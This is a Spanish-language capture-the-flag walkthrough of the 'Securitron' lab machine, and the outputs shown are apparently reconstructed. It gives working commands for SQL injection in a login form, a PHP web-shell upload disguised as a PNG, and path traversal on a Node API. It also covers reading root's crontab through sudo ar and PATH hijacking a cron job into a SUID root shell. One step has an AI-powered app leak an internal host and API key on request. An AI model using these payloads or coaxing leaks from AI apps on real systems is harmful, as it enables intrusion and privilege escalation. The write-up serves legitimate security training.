---
tags: [ctf, thehackerslabs, linux, walkthrough]
tipo: walkthrough
estado: resuelto
---

# Securitron — Walkthrough

> [!note] **comando → salida relevante → interpretación → por qué**. Salidas *(reconstrucción)* del roadmap.

## Paso 1 — Reconocimiento y fuga de información

**Comando**
```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 192.168.56.167
# La app con IA filtra vhost + API key (p.ej. pidiendo "resumen"/"config")
echo "192.168.56.167 admin19-32.securitron.thl" | sudo tee -a /etc/hosts
```

**Interpretación / por qué**
- Las apps con **IA** a veces devuelven contexto interno (hosts, claves). La fuga da el vhost y una **API key** de entrada.

## Paso 2 — SQL Injection en `Admin/login.php`

**Comando**
```bash
# boolean-based
curl -s -X POST http://admin19-32.securitron.thl/Admin/login.php \
  --data "user=admin' AND '1'='1&pass=x"
# time-based cuando no hay diferencia visible
curl -s -X POST http://admin19-32.securitron.thl/Admin/login.php \
  --data "user=admin' AND SLEEP(3)-- -&pass=x" -w '%{time_total}\n'
```

**Interpretación / por qué**
- Si el contenido no cambia, se usa **tiempo** (SLEEP) para inferir verdadero/falso.

## Paso 3 — Subida de avatar con PHP → `www-data`

**Comando**
```bash
curl -s -X POST http://admin19-32.securitron.thl/upload.php \
  -F "avatar=@shell.php;type=image/png"
curl -s "http://admin19-32.securitron.thl/uploads/shell.php?c=id"
```

**Interpretación / por qué**
- Validaciones **MIME** débiles: se sube PHP con `Content-Type: image/png`. Si renombra extensión, se prueban variantes (`.php5`, `.phtml`, mayúsculas).

## Paso 4 — API Node/Express por IPv6 → path traversal

**Comando**
```bash
curl -s "http://[::1]:3000/" 
curl -s --path-as-is "http://[::1]:3000/api/models/..%2f..%2findex.js"
```

**Interpretación / por qué**
- La API escucha en **IPv6** `::1`, no en `127.0.0.1`: hay que usar `[::1]`.
- `/api/models/:fileName` es vulnerable a **path traversal**; `--path-as-is` evita que curl normalice `../`.
- Se lee `index.js` y se obtiene la pista del usuario `securitybot`.

## Paso 5 — `sudo ar` → crontab

**Comando**
```bash
ssh securitybot@192.168.56.167
sudo -l
sudo ar r /tmp/x.a /etc/crontab 2>/dev/null
ar p /tmp/x.a /etc/crontab        # o extraer
```

**Interpretación / por qué**
- `ar` con `sudo` puede **empaquetar/leer** ficheros que el usuario no podría: se exfiltra el **crontab de root**.

## Paso 6 — PATH hijacking → SUID → root

**Comando**
```bash
# El cron de root llama a `date` (ruta controlable)
cat > date <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/bash; chmod +s /tmp/bash
EOF
chmod +x date
export PATH=/tmp:$PATH
# esperar la siguiente ejecución del cron
/tmp/bash -p
id
```

**Interpretación / por qué**
- Si el cron usa `PATH` con un directorio escribible antes que `/bin`, se **sustituye** el binario. Se escala y se confirma con `id`.

## Qué funcionó

- La fuga de info desde la IA como entrada.
- Distinguir **IPv6 localhost** en la API interna.
- `curl --path-as-is` para el traversal.
- `sudo ar` para leer el crontab.
- PATH hijacking en cron.

## Qué falló (y por qué)

- Payloads de upload bloqueados por extensión/MIME hasta encontrar la variante válida.

## Qué aprendí

- SQLi time-based.
- Path traversal en Node.
- `sudo ar` y PATH hijacking.
